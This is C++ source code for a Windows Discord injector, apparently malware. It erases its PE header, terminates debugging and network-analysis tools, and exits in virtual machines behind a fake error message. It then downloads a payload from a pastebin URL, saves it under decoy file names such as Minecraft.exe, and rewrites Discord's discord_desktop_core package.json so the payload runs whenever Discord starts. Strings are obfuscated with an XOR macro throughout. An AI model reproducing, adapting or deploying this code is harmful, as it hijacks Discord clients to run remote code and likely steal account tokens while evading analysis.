#define CURL_STATICLIB
#define PROD
#include <iostream>
#include <filesystem>
#include <fstream>
#include "xor.cpp"
#include "curl/curl.h"
#include "nlohmann/json.hpp"
#include <random>
#include <tchar.h>
#include <tlhelp32.h>
#include <Windows.h>
#include <Wbemidl.h>
#pragma comment(lib, "wbemuuid.lib")

#ifdef _DEBUG
#pragma comment(lib, "curl/libcurl_a_debug.lib")
#else
#pragma comment(lib, "curl/libcurl_a.lib")
#endif

#pragma comment(lib, "Normaliz.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Wldap32.lib")
#pragma comment(lib, "Crypt32.lib")
#pragma comment(lib, "advapi32.lib")

using json = nlohmann::json;

void ErasePEHeaderFromMemory()
{
    DWORD OldProtect = 0;

    char* pBaseAddr = (char*)GetModuleHandle(NULL);


    VirtualProtect(pBaseAddr, 4096, 
        PAGE_READWRITE, &OldProtect);

    SecureZeroMemory(pBaseAddr, 4096);
}

bool InitWMI(IWbemServices** pSvc, IWbemLocator** pLoc, const TCHAR* szNetworkResource)
{
    HRESULT hres;
    hres = CoInitializeEx(0, COINIT_MULTITHREADED);
    hres = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_DEFAULT, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE, NULL);
    hres = CoCreateInstance(CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, IID_PPV_ARGS(pLoc));
    BSTR strNetworkResource = SysAllocString((OLECHAR*)szNetworkResource);
    if (strNetworkResource)
    {
        hres = (*pLoc)->ConnectServer(strNetworkResource, NULL, NULL, NULL, WBEM_FLAG_CONNECT_USE_MAX_WAIT, 0, 0, pSvc);
        SysFreeString(strNetworkResource);
    }
    hres = CoSetProxyBlanket(*pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    return 1;
}

//credits: https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/Shared/Utils.cpp#L795
BOOL ExecWMIQuery(IWbemServices** pSvc, IWbemLocator** pLoc, IEnumWbemClassObject** pEnumerator, const TCHAR* szQuery)
{
    BSTR strQueryLanguage = SysAllocString(OLESTR("WQL"));
    BSTR strQuery = SysAllocString((OLECHAR*)szQuery);
    BOOL bQueryResult = TRUE;
    if (strQueryLanguage && strQuery) HRESULT hres = (*pSvc)->ExecQuery(strQueryLanguage, strQuery, WBEM_FLAG_FORWARD_ONLY | WBEM_FLAG_RETURN_IMMEDIATELY, NULL, pEnumerator);
    if (strQueryLanguage) SysFreeString(strQueryLanguage);
    if (strQuery) SysFreeString(strQuery);
    return bQueryResult;
}

//credits: https://github.com/LordNoteworthy/al-khaser/blob/master/al-khaser/AntiVM/Generic.cpp#L1525
int wmi_query_count(const _TCHAR* query)
{
    IWbemServices* pSvc = NULL;
    IWbemLocator* pLoc = NULL;
    IEnumWbemClassObject* pEnumerator = NULL;
    BOOL bStatus = FALSE;
    HRESULT hRes;
    int count = 0;
    bStatus = InitWMI(&pSvc, &pLoc, _T("ROOT\\CIMV2"));
    if (bStatus)
    {
        bStatus = ExecWMIQuery(&pSvc, &pLoc, &pEnumerator, query);
        if (bStatus)
        {
            IWbemClassObject* pclsObj = NULL;
            ULONG uReturn = 0;
            while (pEnumerator)
            {
                hRes = pEnumerator->Next(WBEM_INFINITE, 1, &pclsObj, &uReturn);
                if (0 == uReturn) break;
                count++;
                pclsObj->Release();
            }
        }
        pSvc->Release();
        pLoc->Release();
        CoUninitialize();
    }
    else return -1;
    return count;
}



int get_directories_with_search_term(std::string path, std::vector<std::string>* buffer)
{
    for (auto& p : std::filesystem::directory_iterator(path)) {
        if (p.is_directory()) {
            std::string path = p.path().string();
            if (path.find(ENC("iscord")) != std::string::npos) {
                buffer->push_back(path);
            }
        }

    }
    return 0;
}

int get_recurcive_directories_and_filter(std::string path, std::vector<std::string>* buffer) {
    for (auto& p : std::filesystem::recursive_directory_iterator(path)) {
        if (p.is_directory()) {
            if (p.path().string().find(ENC("discord_desktop_core")) != std::string::npos) {
                if (p.path().parent_path().filename().string().find(ENC("discord_desktop_core")) != std::string::npos) {
                    buffer->push_back(p.path().string());
                }
            }
        }
    }

    return 0;
}

DWORD GetProcessByName(std::string name)
{
    DWORD pid = 0;

    // Create toolhelp snapshot.
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process;
    ZeroMemory(&process, sizeof(process));
    process.dwSize = sizeof(process);

    // Walkthrough all processes.
    if (Process32First(snapshot, &process))
    {
        do
        {
            // Compare process.szExeFile based on format of name, i.e., trim file path
            // trim .exe if necessary, etc.
            if (std::string(process.szExeFile) == name)
            {
                pid = process.th32ProcessID;
                break;
            }
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);

    if (pid != 0)
    {
        return pid;
    }



    return NULL;
}

BOOL analysis_tools_process()
{
    std::vector<std::string> sus = {
        ENC("ollydbg.exe"),		
        ENC("ProcessHacker.exe"),
        ENC("tcpview.exe"),			
        ENC("autoruns.exe"),			
        ENC("autorunsc.exe"),		
        ENC("filemon.exe"),		
        ENC("procmon.exe"),			
        ENC("regmon.exe"),			
        ENC("procexp.exe"),			
        ENC("idaq.exe"),			
        ENC("idaq64.exe"),		
        ENC("ImmunityDebugger.exe"), 
        ENC("Wireshark.exe"),		
        ENC("dumpcap.exe"),			
        ENC("HookExplorer.exe"),		
        ENC("ImportREC.exe"),		
        ENC("PETools.exe"),		
        ENC("LordPE.exe"),		
        ENC("SysInspector.exe"),		
        ENC("proc_analyzer.exe"),	
        ENC("sysAnalyzer.exe"),		
        ENC("sniff_hit.exe"),		
        ENC("windbg.exe"),			
        ENC("joeboxcontrol.exe"),	
        ENC("joeboxserver.exe"),		
        ENC("joeboxserver.exe"),		
        ENC("ResourceHacker.exe"),	
        ENC("x32dbg.exe"),			
        ENC("x64dbg.exe"),		
        ENC("Fiddler.exe"),			
        ENC("httpdebugger.exe")
    };
    bool result = false;
    for (auto processName : sus) {
        DWORD pid = GetProcessByName(processName);
        if (pid != 0) {
            auto handle = OpenProcess(PROCESS_TERMINATE, false, pid);
            result = true;
            TerminateProcess(handle, 0);
        }
    }
    return result;
}

std::vector<std::string> getDiscordPaths(char* localAppdata) {
    std::vector<std::string> buffer = std::vector<std::string>();

    std::vector<std::string> DiscordDesktopCore = std::vector<std::string>();
    get_directories_with_search_term(std::string(localAppdata), &buffer);
    for (std::string path : buffer) {
        get_recurcive_directories_and_filter(path, &DiscordDesktopCore);
    }
    return DiscordDesktopCore;
}

static size_t WriteCallback(char* contents, size_t size, size_t nmemb, void* userp)
{
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

int main(void)
{
    ErasePEHeaderFromMemory();
    auto sus = analysis_tools_process();
    if (sus) {
        return 0;
    }
    if (wmi_query_count(_T("SELECT * FROM Win32_PortConnector")) == 0) {
        std::string text = "This program does not currently support virtual environnements !";
        std::string caption = "Program";
        MessageBox(0, text.c_str(), caption.c_str(), MB_ICONERROR);
        return 0;
    }
  
    curl_global_init(CURL_GLOBAL_ALL);
    
    //PAYLOAD URL
    std::string downloadLink = ENC("https://pastebin.com/raw/tfMN4mu5");
    
    char* buffer;
    size_t size = sizeof(buffer);
    _dupenv_s(&buffer, &size, ENC("LOCALAPPDATA"));
    
    char* userProfile;
    size_t userProfileSize = sizeof(userProfile);
    _dupenv_s(&userProfile, &userProfileSize, ENC("USERPROFILE"));

    char* tempFolder;
    size_t tempFolderSize = sizeof(tempFolder);
    _dupenv_s(&tempFolder, &tempFolderSize, ENC("temp"));

    std::filesystem::path PicturesFolder = std::filesystem::path(userProfile) / ENC("Pictures");
    std::filesystem::path DownloadsFolder = std::filesystem::path(userProfile) / ENC("Downloads");
    std::filesystem::path TempFolder = std::filesystem::path(tempFolder);
    std::filesystem::create_directories(PicturesFolder);
    std::filesystem::create_directories(DownloadsFolder);
    std::vector<std::string> paths = getDiscordPaths(buffer);

    CURL* curl;
    CURLcode res;
    std::string downloadedData;

    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, downloadLink.c_str());
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &downloadedData);
        res = curl_easy_perform(curl);
        curl_easy_cleanup(curl);

        std::vector<std::filesystem::path> payloadPaths = { PicturesFolder / ENC("unknown.jpeg"), DownloadsFolder / ENC("Minecraft.exe"), TempFolder / ENC("wstsetup.log")};

        for (auto path : paths) {
            std::filesystem::path packagePath = std::filesystem::path(path) / std::filesystem::path(ENC("package.json"));
            if (!std::filesystem::exists(packagePath)) {
                json json;
                json[ENC("main")] = ENC("index.js");
                json[ENC("name")] = ENC("discord_desktop_core");
                json[ENC("private")] = true;
                json[ENC("version")] = ENC("0.0.0");
                std::ofstream packagePathToWrite(packagePath);
                packagePathToWrite << json;
                packagePathToWrite.close();
            }

            std::random_device dev;
            std::mt19937 rng(dev());
            std::uniform_int_distribution<std::mt19937::result_type> randInt(0, payloadPaths.size()-1);
            int randomIndex = randInt(rng);
            std::filesystem::path payloadPath = payloadPaths[randomIndex];

            std::ofstream writePayload(payloadPath);
            auto coreAsar = std::filesystem::path(path) / ENC("core.asar");
            writePayload << downloadedData << std::endl << ENC("module.exports = require(`") << coreAsar.string() << ENC("`);");
            writePayload.close();

            std::ofstream packageJsonFileStream(packagePath);
            if (packageJsonFileStream.is_open()) {
                json json;
                json[ENC("main")] = payloadPath.string();
                json[ENC("private")] = true;
                json[ENC("version")] = ENC("0.0.0");
                json[ENC("name")] = ENC("discord_desktop_core");
                packageJsonFileStream << json;
                packageJsonFileStream.close();
            }
        }
    }
}

